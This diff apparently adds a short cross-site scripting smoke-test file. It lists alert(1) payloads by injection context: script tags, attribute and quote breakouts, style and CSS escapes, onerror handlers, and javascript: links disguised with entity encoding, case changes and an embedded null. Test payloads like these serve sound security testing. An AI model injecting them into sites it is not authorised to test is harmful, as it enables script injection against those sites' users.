@@ -1,0 +1,86 @@
+#
+# Really simple XSS smoke test
+#
+
+#
+# Script Tags
+#
+
+# in plain text context - duh
+<script>alert(1);</script>
+
+# as attribute <tag $USERINPUT></tag>
+><script>alert(1);</script>
+
+# as unquoted value <tag foo=$USERINPUT></tag>
+x ><script>alert(1);</script>
+
+# as single quoted value <tag foo='$USERINPUT'></tag>
+' ><script>alert(1);</script>
+
+# as double quoted value <tag foo="$USERINPUT"></tag>
+"><script>alert(1);</script>
+
+# inside <style>div:color=$USERINPUT;.. </style>
+red;</style><script>alert(1);</script>
+
+# inside <style>div { color=$USERINPUT;..} </style>
+red;}</style><script>alert(1);</script>
+
+# inside <div style="color:$USERINPUT"...
+red;"/><script>alert(1);</script>
+
+# inside CSS URL, e.g.  background-image:url('$USERINPUT')
+');}</style><script>alert(1);</script>
+
+
+#
+# onerror (or on-other)
+#
+
+#  as attribute <tag $USERINPUT></tag>
+ onerror=alert(1)>
+
+# as unquoted value <tag foo=$USERINPUT></tag>
+x onerror=alert(1);>
+
+# as single quoted value <tag foo='$USERINPUT'></tag>
+x' onerror=alert(1);>
+
+# as double quoted value <tag foo='$USERINPUT'></tag>
+x" onerror=alert(1);>
+
+#
+# href-like
+#
+
+# duh
+<a href="javascript:alert(1)">
+
+<a href='javascript:alert(1)'>
+
+<a href=javascript:alert(1)>
+
+<a href  =   javascript:alert(1); >
+
+<a href="  javascript:alert(1);" >
+
+<a href="JAVASCRIPT:alert(1);" >
+
+<a href="&#32;javascript:alert(1)" >
+
+<a href="&#00032;javascript:alert(1)" >
+
+<a href="&#x20;javascript:alert(1)" >
+
+# does not work
+#<a href="&nbsp;javascript:alert(1)" >
+
+<a href="&#X20;javascript:alert(1)" >
+
+<a href="&#74;avascript:alert(1)" >
+
+<a href="&#000074;avascript:alert(1)" >
+
+# really a raw embedded null
+<a href="j&#0;avascript:alert(1)">
